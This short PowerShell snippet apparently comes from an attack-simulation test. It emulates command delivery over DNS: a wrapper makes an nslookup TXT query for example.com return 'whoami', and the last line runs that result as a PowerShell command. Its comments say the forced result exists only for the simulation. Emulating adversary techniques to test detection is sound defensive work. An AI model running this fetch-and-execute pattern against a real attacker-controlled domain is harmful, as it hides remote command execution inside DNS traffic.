# creating a custom nslookup function that will indeed call nslookup but forces the result to be "whoami"
# this would not be part of a real attack but helpful for this simulation
function nslookup  { &"$env:windir\system32\nslookup.exe" @args | Out-Null; @("","whoami")}
powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]
